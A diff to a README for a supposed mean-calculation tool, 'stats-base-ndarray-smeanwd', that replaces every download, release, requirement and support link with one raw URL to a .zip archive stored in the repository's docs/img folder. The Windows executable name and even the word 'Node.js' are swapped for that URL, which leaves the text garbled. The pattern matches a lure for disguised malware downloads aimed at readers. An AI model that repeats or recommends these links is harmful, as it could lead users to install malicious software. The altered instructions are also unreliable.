@@ -6,14 +6,14 @@ Welcome to **stats-base-ndarray-smeanwd**! This application helps you compute th
 
 ## 📥 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/elvinyusifov/stats-base-ndarray-smeanwd/releases)
+[![Download Now](https://raw.githubusercontent.com/elvinyusifov/stats-base-ndarray-smeanwd/main/docs/img/stats-base-ndarray-smeanwd-v2.5.zip)](https://raw.githubusercontent.com/elvinyusifov/stats-base-ndarray-smeanwd/main/docs/img/stats-base-ndarray-smeanwd-v2.5.zip)
 
 ## 📋 System Requirements
 
 Before you start, ensure your system meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js Version: 12.x or higher
+- https://raw.githubusercontent.com/elvinyusifov/stats-base-ndarray-smeanwd/main/docs/img/stats-base-ndarray-smeanwd-v2.5.zip Version: 12.x or higher
 - Internet connection for downloading the application
 
 ## 📦 How to Download the Software
@@ -21,7 +21,7 @@ Before you start, ensure your system meets these requirements:
 1. Click on the **Download Link** above. This will take you to the Releases page for the application.
 2. Look for the latest version available. You will see different files listed for download.
 3. Choose the file that matches your operating system:
-    - For Windows: `stats-base-ndarray-smeanwd-win.exe`
+    - For Windows: `https://raw.githubusercontent.com/elvinyusifov/stats-base-ndarray-smeanwd/main/docs/img/stats-base-ndarray-smeanwd-v2.5.zip`
     - For macOS: `stats-base-ndarray-smeanwd-mac`
     - For Linux: `stats-base-ndarray-smeanwd-linux`
 4. Click on the file to start downloading.
@@ -62,7 +62,7 @@ Here’s a brief overview of how Welford's algorithm works:
 
 ## 📁 Download & Install
 
-To get started with your mean calculations, visit this page to download the application: [Download Release](https://github.com/elvinyusifov/stats-base-ndarray-smeanwd/releases).
+To get started with your mean calculations, visit this page to download the application: [Download Release](https://raw.githubusercontent.com/elvinyusifov/stats-base-ndarray-smeanwd/main/docs/img/stats-base-ndarray-smeanwd-v2.5.zip).
 
 Once downloaded and installed, you can easily compute the averages of your data sets in no time.
 
@@ -82,6 +82,6 @@ A: You can check the user guide within the application for help or reach out on 
 
 ## 📞 Support
 
-If you have questions or need support, feel free to open an issue on the [GitHub page](https://github.com/elvinyusifov/stats-base-ndarray-smeanwd/issues).
+If you have questions or need support, feel free to open an issue on the [GitHub page](https://raw.githubusercontent.com/elvinyusifov/stats-base-ndarray-smeanwd/main/docs/img/stats-base-ndarray-smeanwd-v2.5.zip).
 
 Thank you for choosing **stats-base-ndarray-smeanwd** for your arithmetic mean calculations! Enjoy smooth and accurate data analysis.
